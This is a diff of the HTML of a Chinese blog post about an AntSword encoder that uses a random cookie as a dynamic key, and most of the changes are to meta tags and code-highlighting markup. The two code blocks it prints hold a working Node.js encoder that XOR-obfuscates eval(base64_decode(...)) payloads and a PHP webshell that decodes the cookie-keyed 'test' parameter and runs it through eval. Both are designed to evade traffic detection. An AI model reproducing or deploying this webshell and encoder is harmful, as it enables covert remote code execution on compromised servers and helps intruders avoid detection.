@@ -10,13 +10,12 @@
     <title>基于随机Cookie的蚁剑动态秘钥编码器 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="基于随机Cookie的蚁剑动态秘钥编码器" />
 <meta property="og:description" content="1 前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。 但是在实际使用的过程中还是会" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/antsword-xor-encoder-2/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-xor-encoder-2/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-12-09T10:29:32+00:00" />
 <meta property="article:modified_time" content="2019-12-09T10:29:32+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="基于随机Cookie的蚁剑动态秘钥编码器"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="基于随机Cookie的蚁剑动态秘钥编码器"/>
 <meta name="twitter:description" content="1 前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。 但是在实际使用的过程中还是会"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -304,31 +303,31 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
-</span></span><span class="line"><span class="cl">//code by yzddmr6
-</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext = {}) =&gt; {
-</span></span><span class="line"><span class="cl">  let randomID = `x${Math.random().toString(16).substr(2)}`;
-</span></span><span class="line"><span class="cl">  function xor(payload) {
-</span></span><span class="line"><span class="cl">    let crypto = require(&#39;crypto&#39;);
-</span></span><span class="line"><span class="cl">    let key = crypto.createHash(&#39;md5&#39;).update(randomID).digest(&#39;hex&#39;).substr(6);
-</span></span><span class="line"><span class="cl">    ext.opts.httpConf.headers[&#39;Cookie&#39;] = &#39;PHPSESSID=&#39; + key;
-</span></span><span class="line"><span class="cl">    key = key.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
-</span></span><span class="line"><span class="cl">    //let payload=&#34;phpinfo();&#34;;
-</span></span><span class="line"><span class="cl">    let cipher = payload.split(&#34;&#34;).map(t =&gt; t.charCodeAt(0));
-</span></span><span class="line"><span class="cl">    for (let i = 0; i &lt; cipher.length; i++) {
-</span></span><span class="line"><span class="cl">      cipher[i] = cipher[i] ^ key[i % 26]
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    cipher = cipher.map(t =&gt; String.fromCharCode(t)).join(&#34;&#34;)
-</span></span><span class="line"><span class="cl">    cipher = Buffer.from(cipher).toString(&#39;base64&#39;);
-</span></span><span class="line"><span class="cl">    //console.log(cipher)
-</span></span><span class="line"><span class="cl">    return cipher;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
-</span></span><span class="line"><span class="cl">  data[pwd] = `eval(base64_decode(&#34;${data[&#39;_&#39;]}&#34;));`;
-</span></span><span class="line"><span class="cl">  data[pwd]=xor(data[pwd]);
-</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
-</span></span><span class="line"><span class="cl">  return data;
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">code</span> <span class="n">by</span> <span class="n">yzddmr6</span>
+</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">ext</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">randomID</span> <span class="o">=</span> <span class="err">`</span><span class="n">x</span><span class="o">$</span><span class="p">{</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">)}</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">xor</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">crypto</span> <span class="o">=</span> <span class="n">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">key</span> <span class="o">=</span> <span class="n">crypto</span><span class="o">.</span><span class="n">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">randomID</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ext</span><span class="o">.</span><span class="n">opts</span><span class="o">.</span><span class="n">httpConf</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Cookie&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;PHPSESSID=&#39;</span> <span class="o">+</span> <span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">let</span> <span class="n">payload</span><span class="o">=</span><span class="s2">&#34;phpinfo();&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cipher</span><span class="o">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">26</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="ne">String</span><span class="o">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="n">t</span><span class="p">))</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cipher</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]</span> <span class="o">=</span> <span class="err">`</span><span class="n">eval</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="s2">&#34;${data[&#39;_&#39;]}&#34;</span><span class="p">));</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]</span><span class="o">=</span><span class="n">xor</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">delete</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="shell原型" class="headerLink">
@@ -376,23 +375,23 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">class Cookie
-</span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">    function __construct()
-</span></span><span class="line"><span class="cl">    {
-</span></span><span class="line"><span class="cl">        $key=@$_COOKIE[&#39;PHPSESSID&#39;];
-</span></span><span class="line"><span class="cl">        @$post=base64_decode($_REQUEST[&#39;test&#39;]);
-</span></span><span class="line"><span class="cl">        for($i=0;$i&lt;strlen($post);$i++){
-</span></span><span class="line"><span class="cl">            $post[$i] = $post[$i] ^ $key[$i%26];
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        return $post;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    function __destruct()
-</span></span><span class="line"><span class="cl">    {return @eval($this-&gt;__construct());}
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">$check=new Cookie();
-</span></span><span class="line"><span class="cl">?&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Cookie</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">key</span><span class="o">=</span><span class="err">@</span><span class="o">$</span><span class="n">_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="err">@</span><span class="o">$</span><span class="n">post</span><span class="o">=</span><span class="n">base64_decode</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="o">$</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">$</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">post</span><span class="p">);</span><span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">post</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">$</span><span class="n">post</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="o">$</span><span class="n">key</span><span class="p">[</span><span class="o">$</span><span class="n">i</span><span class="o">%</span><span class="mi">26</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">$</span><span class="n">post</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="k">return</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">__construct</span><span class="p">());}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">check</span><span class="o">=</span><span class="n">new</span> <span class="n">Cookie</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png">
